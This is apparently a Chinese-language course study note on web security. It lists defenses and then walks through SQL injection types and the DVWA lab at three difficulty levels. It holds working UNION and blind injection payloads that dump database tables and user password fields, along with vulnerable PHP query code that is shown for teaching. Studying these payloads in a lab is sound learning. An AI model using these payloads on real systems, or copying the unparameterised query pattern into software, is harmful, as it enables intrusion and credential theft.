@@ -1,0 +1,129 @@
+期末參考
+前端
+SQL Injection 防護 (字串消毒)
+CAPTCHA / reCAPTCHA
+輸入驗證（格式檢查、長度限制）
+錯誤訊息控管（避免洩漏帳號存在與否）
+密碼強度檢查
+…
+後端
+SQL Injection 防護（Prepared Statements / ORM）
+暴力登入防止（封鎖帳號 / IP、計數機制）
+權限控制
+密碼雜湊與加鹽
+Session / Token 安全（HttpOnly、Secure、過期時間）
+多因素驗證
+信箱驗證
+API Rate Limiting
+安全日誌紀錄（登入失敗、異常行為）
+…
+其他
+Firewall
+Web Application Firewall
+日誌蒐集
+日誌自動化分析與告警
+IDS
+IPS
+備份計畫
+災難回復策略
+…
+SQL Injection
+利用未經處理的輸入拼接 SQL 語句，操控資料庫查詢
+不安全的 SQL 語句可能造成資料外洩、繞過認證、竄改資料、取得系統控制權
+
+SQL Injection 類型
+Error-based SQLi
+利用資料庫錯誤訊息回傳，直接取得表格、欄位資訊。
+例：' OR 1=1 -- -、' UNION SELECT version() -- -
+Boolean-based Blind SQLi
+透過 True/False 判斷，逐步猜測資料。
+例：' AND SUBSTRING((SELECT database()),1,1)='d' -- -
+Time-based Blind SQLi
+利用延遲函數 (如 SLEEP()、pg_sleep()) 判斷條件是否成立。
+例：' AND IF(SUBSTRING((SELECT database()),1,1)='d', SLEEP(5), 0) -- -
+Union-based SQLi
+使用 UNION SELECT 合併查詢，直接 dump 出資料。
+例：' UNION SELECT user(), database(), version() -- -
+Payloads
+https://github.com/payloadbox/sql-injection-payload-list
+/usr/share/wordlists/seclists/Fuzzing/Databases/SQLi/*
+https://github.com/swisskyrepo/PayloadsAllTheThings
+SQL 註解符號
+-- -
+#
+DVWA - SQL Injection
+Low
+' or 1=1 -- -
+https://hackmd.io/_uploads/rJFe7cZMbe.png
+透過 boolean based SQL Injection 查詢所有 ID
+
+從傳回的 First name , Surname 可知查詢語句會傳兩個欄位的值
+所以 UNION ALL SELECT 語句 用一個 NULL 填充
+
+1' UNION ALL SELECT DATABASE(),NULL-- -
+
+https://hackmd.io/_uploads/Byw-5c-f-g.png
+當前資料庫名為 dvwa
+https://hackmd.io/_uploads/BksR95ZMZl.png
+查詢 "dvwa" 資料庫表格
+
+' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=DATABASE() -- -
+
+
+查詢表格欄位
+https://hackmd.io/_uploads/HybVo5-Gbx.png
+
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' -- -
+
+
+透過 CONCAT 合併欄位資料一次提取資料表資料
+https://hackmd.io/_uploads/rJwnjcZf-g.png
+
+' UNION SELECT CONCAT_WS(':', user_id, first_name, last_name, user, password, avatar, last_login, failed_login), NULL FROM users -- -
+
+
+# 使用者輸入的 id 沒有任何過濾或驗證
+$id = $_REQUEST['id'];
+# $id 被直接放入 SQL 語句中
+$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
+# 沒有使用 Prepared Statement 或 參數化查詢 或字串消毒
+$result = mysqli_query($GLOBALS["___mysqli_ston"], $query);
+輸入 ' or 1=1 -- -  時 SQL 語句變化
+
+SELECT first_name, last_name FROM users WHERE user_id = '' or 1=1 -- -';
+user_id = '' 不成立。
+OR 1=1 永遠為真，整個 WHERE 條件成立。
+-- - SQL 註解符號，後面的 '; 注釋掉，不再執行
+語句效果等於
+
+SELECT first_name, last_name FROM users WHERE 1=1;
+回傳整張 users 表的所有紀錄
+
+Medium
+用 Burp , 瀏覽器工具 Edit and send , 直接改前端都可以
+
+1 UNION ALL SELECT NULL,CONCAT(DATABASE())-- -
+https://hackmd.io/_uploads/HJbl1sZMZe.png
+
+# mysqli_real_escape_string() 只能處理字串中的特殊字元（如 '、"）
+$id = $_POST['id'];
+$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);
+# $id 沒有被加上引號，而是直接當作數字插入
+$query = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
+不能信任前端輸入，後端應嚴謹檢查
+
+High
+https://hackmd.io/_uploads/SkzjZsbMZg.png
+
+1' UNION SELECT DATABASE(), NULL -- -
+https://hackmd.io/_uploads/r1NO4oZzZe.png
+
+1' UNION SELECT CONCAT_WS(':', user_id, first_name, last_name, user, password, avatar, last_login, failed_login), NULL FROM users -- -
+https://hackmd.io/_uploads/r1xjNi-zbe.png
+
+SQLi 預防
+使用 Prepared Statements / Parameterized Queries
+輸入驗證與清洗
+最小權限原則
+錯誤訊息控管
+Web Application Firewall (WAF)
